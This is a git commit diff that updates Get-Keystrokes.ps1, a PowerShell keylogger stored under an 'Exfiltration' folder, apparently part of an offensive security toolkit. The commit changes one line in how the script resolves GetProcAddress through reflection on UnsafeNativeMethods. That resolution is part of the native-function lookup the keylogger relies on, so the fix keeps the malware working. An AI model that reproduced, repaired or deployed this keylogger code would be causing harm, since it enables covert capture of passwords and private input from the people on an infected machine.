ea55e6faa9836003d13433966f3f0efc2677a627
Arce <22849351+Senas23@users.noreply.github.com>
2019-04-04 14:43:30 -0500

    Update Get-Keystrokes.ps1

--- Exfiltration/Get-Keystrokes.ps1
+++ Exfiltration/Get-Keystrokes.ps1
@@ -108,7 +108,7 @@ function Get-Keystrokes {
             $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
             # Get a reference to the GetModuleHandle and GetProcAddress methods
             $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)
+            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
             # Get a handle to the module specified
             $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
             $tmpPtr = New-Object IntPtr
